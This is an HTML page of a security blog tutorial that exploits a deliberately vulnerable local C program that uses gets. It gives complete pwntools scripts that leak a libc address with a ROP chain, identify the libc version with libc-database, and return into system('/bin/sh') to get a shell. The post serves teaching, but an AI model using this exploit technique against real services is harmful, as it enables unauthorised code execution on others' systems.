@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://tasteofsecurity.com/">
+
+<meta name="twitter:image" content="https://tasteofsecurity.com/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="A taste of security">
+<meta name="twitter:description" property="og:description" itemprop="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://tasteofsecurity.com/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://tasteofsecurity.com/tn.png">
+
+<link rel="shortcut icon" href="https://tasteofsecurity.com/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://tasteofsecurity.com/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+    
+
+    
+    
+    
+    <title>
+        
+        Binary exploitation: ret2libc &#43; unknown libc
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">Binary exploitation: ret2libc &#43; unknown libc</div>
+
+        
+<div class="section" id="content">
+    Tue Jan 22, 2019  &#183; 7 min read
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/ret2libc">
+                ret2libc
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/rop">
+                rop
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/pwn">
+                pwn
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    <p>This post will guide your through how to exploit a binary with a <code>unknown libc</code>. The post will cover details on how to perform a static and dynamic analysis of the binary and also explain how to perform a <code>ret2libc</code> attack.</p>
+<h2 id="tools-needed">Tools needed</h2>
+<ul>
+<li>Linux</li>
+<li>pwntools</li>
+<li>python</li>
+<li><a href="https://github.com/niklasb/libc-database">libc-database</a></li>
+<li>radare2 / gdb</li>
+</ul>
+<h2 id="setup">Setup</h2>
+<p>Filename: <code>vuln.c</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">32</span>];
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Simple ROP.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    gets(buffer);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Filename: <code>Makefile</code></p>
+<pre><code>all:
+    gcc -o vuln vuln.c -fno-stack-protector  -no-pie
+</code></pre><ul>
+<li>To compile the program, run <code>make</code> in the same directory as the files.</li>
+<li>You should now have a binary called <code>vuln</code> that you can run with <code>./vuln</code></li>
+</ul>
+<h2 id="static-analysis">Static analysis</h2>
+<p>First we need to figure out if the binary is <code>32-bit</code> or <code>64-bit</code>. This can be done with the <code>file</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file vuln
+vuln: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]</span><span style="color:#f92672">=</span>09907533b43263caa145e3320b6e9ed01be10746, not stripped
+</code></pre></div><p>We are dealing with a <code>64-bit</code> binary. Now we need to figure out which protections are enabled. This can with the <code>checksec</code> that comes with <code>pwntools</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ checksec vuln
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/rop2win/vuln&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</code></pre></div><ul>
+<li>
+<p><code>NX enabled</code>, which stands for <code>non-executable</code>. This means we can&rsquo;t do a classic buffer overflow and place our shellcode onto the stack. We have to resort to other options as stack segment is non executable.</p>
+</li>
+<li>
+<p><code>NO canary</code>, no stack canary which is good as it will become much easier for us to exploit the binary later.</p>
+</li>
+<li>
+<p>ASLR is probably enabled.</p>
+</li>
+</ul>
+<p>Now we have gather a lot of useful information about the binary. Let&rsquo;s fire up <code>radare2</code> to do some static analysis of the binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ r2 vuln
+<span style="color:#f92672">[</span>0x7fedca20a090<span style="color:#f92672">]</span>&gt; aaa
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze <span style="color:#66d9ef">function</span> calls <span style="color:#f92672">(</span>aac<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze len bytes of instructions <span style="color:#66d9ef">for</span> references <span style="color:#f92672">(</span>aar<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Constructing a <span style="color:#66d9ef">function</span> name <span style="color:#66d9ef">for</span> fcn.* and sym.func.* functions <span style="color:#f92672">(</span>aan<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Type matching analysis <span style="color:#66d9ef">for</span> all functions <span style="color:#f92672">(</span>afta<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Use -AA or aaaa to perform additional experimental analysis
+<span style="color:#f92672">[</span>0x7fedca20a090<span style="color:#f92672">]</span>&gt; s main
+<span style="color:#f92672">[</span>0x00400537<span style="color:#f92672">]</span>&gt; pdf
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#75715e">;-- main:
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">fcn</span>) <span style="color:#66d9ef">sym.main</span> <span style="color:#ae81ff">44</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#a6e22e">sym.main</span> (<span style="color:#66d9ef">int</span> <span style="color:#66d9ef">argc</span>, <span style="color:#66d9ef">char</span> **<span style="color:#66d9ef">argv</span>, <span style="color:#66d9ef">char</span> **<span style="color:#66d9ef">envp</span>)<span style="color:#75715e">;
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#75715e">; var int local_20h @ rbp-0x20
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#75715e">; DATA XREF from entry0 (0x40046d)
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#ae81ff">0x00400537</span>      <span style="color:#ae81ff">55</span>             <span style="color:#66d9ef">push</span> <span style="color:#66d9ef">rbp</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00400538</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">e5</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">rsp</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040053b</span>      <span style="color:#ae81ff">4883</span><span style="color:#66d9ef">ec20</span>       <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x20</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040053f</span>      <span style="color:#ae81ff">488</span><span style="color:#66d9ef">d3dae0000.</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">str.Simple_ROP.</span>    <span style="color:#75715e">; 0x4005f4 ; &#34;Simple ROP.\n&#34;
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#ae81ff">0x00400546</span>      <span style="color:#66d9ef">e8e5feffff</span>     <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.imp.puts</span>           <span style="color:#75715e">; int puts(const char *s)
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#ae81ff">0x0040054b</span>      <span style="color:#ae81ff">488</span><span style="color:#66d9ef">d45e0</span>       <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">local_20h</span>]
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040054f</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">c7</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00400552</span>      <span style="color:#66d9ef">b800000000</span>     <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00400557</span>      <span style="color:#66d9ef">e8e4feffff</span>     <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.imp.gets</span>           <span style="color:#75715e">; char *gets(char *s)
+</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#ae81ff">0x0040055c</span>      <span style="color:#66d9ef">b800000000</span>     <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0</span>
+<span style="color:#960050;background-color:#1e0010">|</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00400561</span>      <span style="color:#66d9ef">c9</span>             <span style="color:#66d9ef">leave</span>
+<span style="color:#960050;background-color:#1e0010">\</span>           <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00400562</span>      <span style="color:#66d9ef">c3</span>             <span style="color:#66d9ef">ret</span>
+</code></pre></div><p>Psuedo code from this assembly code will look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+    <span style="color:#66d9ef">char</span> local_20[<span style="color:#ae81ff">32</span>];
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Simple ROP.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    gets(local_20);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>We know from the <code>man</code> page of <code>gets</code> that the function should never be used as it will create a buffer overflow.</p>
+<pre><code>BUGS
+       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because  gets()  will  con‐
+       tinue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
+</code></pre>
+<h4 id="summary">Summary</h4>
+<p>Cool, lets sum up what we have figured out so far:</p>
+<ul>
+<li>64-bit binary</li>
+<li>NX enabled</li>
+<li>No stack canary</li>
+<li>Use of vulnerable function <code>gets</code>.</li>
+<li>Buffer size of only 32 characters.</li>
+<li>ASLR Probably enabled</li>
+</ul>
+<h2 id="dynamic-analysis">Dynamic analysis</h2>
+<p>Playing around with the binary we first see if our static analysis is correct</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./vuln 
+Simple ROP.
+
+hello
+</code></pre></div><p>Correct. First a call to <code>puts</code>, then a call to <code>gets</code>. Let&rsquo;s see if we can get the program to crash by entering a bigger payload.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./vuln 
+Simple ROP.
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</code></pre></div><p>A <code>segmentation fault</code> occurred when we entered a payload bigger than 32 characters. This means we overwrote the return address of the stack frame with <code>A's</code> which is <code>0x41</code> in hex, which is a invalid address that the program will jump to and then crash as the instruction does not exist.</p>
+<h2 id="leaking-libc-address-with-pwntools">Leaking libc address with pwntools</h2>
+<p>We know we can&rsquo;t do a text box buffer overflow. What we can do instead is do a ROP attack. First we need to leak a LIBC address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -t vuln
+..
+<span style="color:#ae81ff">0000000000000000</span>       F *UND*  <span style="color:#ae81ff">0000000000000000</span>              __libc_start_main@@GLIBC_2.2.5
+..
+</code></pre></div><p>I choose to leak libc address of <code>__libc_start_main</code>.</p>
+<p>Let&rsquo;s create a rop chain that will:</p>
+<ol>
+<li>Overflow buffer until return address</li>
+<li>Call <code>pop rdi; ret</code> gadget</li>
+<li>Place <code>__libc_start_main</code> onto the stack</li>
+<li>Call <code>puts@plt</code></li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./vuln</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./vuln</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
+rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
+
+<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rdi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ret</span><span style="color:#e6db74">&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">puts@plt: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__libc_start_main: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pop rdi gadget: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+base <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ROP.</span><span style="color:#e6db74">&#34;</span>, rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+p<span style="color:#f92672">.</span>recvline()
+p<span style="color:#f92672">.</span>recvline()
+recieved <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+leak <span style="color:#f92672">=</span> u64(recieved<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Running the script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./vuln&#39;</span>: pid 14155
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> puts@plt: 0x40042c
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> __libc_start_main: 0x600ff0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pop rdi gadget: 0x4005d3
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Leaked libc address,  __libc_start_main: 0x7f0c5fbbaab0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopped process <span style="color:#e6db74">&#39;./vuln&#39;</span> <span style="color:#f92672">(</span>pid 14155<span style="color:#f92672">)</span>
+</code></pre></div><p>Now we have managed to leak a <code>libc address</code> which is <code>0x7f0c5fbbaab0</code>. Without knowing the version of the libc, it&rsquo;s impossible to calculate offsets to other libc functions. <code>puts</code> and <code>gets</code> will only get us so far. <code>system</code> would be more useful.</p>
+<h3 id="unknown-libc-version-is-it-really-unknown">Unknown libc version, is it really unknown?</h3>
+<p>I will use <a href="https://github.com/niklasb/libc-database">libc-database</a> for this.</p>
+<p>To install run:</p>
+<ul>
+<li><code>$ git clone https://github.com/niklasb/libc-database.git</code></li>
+<li><code>$ cd libc-database</code></li>
+<li><code>$ ./get</code></li>
+</ul>
+<p>This will take some time, be patient.</p>
+<p>For this to work we need:</p>
+<ul>
+<li>Libc symbol name: <code>__libc_start_main</code></li>
+<li>Leaked libc adddress: <code>0x7f0c5fbbaab0</code></li>
+</ul>
+<p>We can figure out which libc that is most likely used.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./find __libc_start_main 0x7f0c5fbbaab0
+http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb <span style="color:#f92672">(</span>id libc6_2.27-3ubuntu1_amd64<span style="color:#f92672">)</span>
+</code></pre></div><p>We get <code>1 match</code> which is <code>libc6_2.27-3ubuntu1_amd64</code>!</p>
+<p>Let&rsquo;s download the libc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./download libc6_2.27-3ubuntu1_amd64
+Getting libc6_2.27-3ubuntu1_amd64
+  -&gt; Location: http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb
+  -&gt; Downloading package
+  -&gt; Extracting package
+  -&gt; Package saved to libs/libc6_2.27-3ubuntu1_amd64
+</code></pre></div><p>Copy the libc from <code>libc/libc6_2.27-3ubuntu1_amd64/libc-2.27.so</code> to our working directory.</p>
+<h2 id="building-the-final-payload-ret2libc">Building the final payload: ret2libc</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./vuln</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./vuln</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e"># Extract data from binary</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc-2.27.so</span><span style="color:#e6db74">&#34;</span>)
+rop <span style="color:#f92672">=</span> ROP(elf)<span style="color:#75715e"># Find ROP gadgets</span>
+
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rdi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ret</span><span style="color:#e6db74">&#39;</span>]))[<span style="color:#ae81ff">0</span>]<span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ret</span><span style="color:#e6db74">&#39;</span>]))[<span style="color:#ae81ff">0</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">puts@plt: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__libc_start_main: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pop rdi gadget: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+<span style="color:#75715e">#Overflow buffer until return address</span>
+base <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ROP.</span><span style="color:#e6db74">&#34;</span>, rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+p<span style="color:#f92672">.</span>recvline()
+p<span style="color:#f92672">.</span>recvline()
+recieved <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+leak <span style="color:#f92672">=</span> u64(recieved<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#34;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Address of libc </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(libc<span style="color:#f92672">.</span>address))
+
+BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
+SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#34;</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">bin/sh </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(BINSH))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">system </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(SYSTEM))
+
+rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
+
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ROP.</span><span style="color:#e6db74">&#34;</span>, rop2)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Running the exploit we get <code>shell</code>.</p>
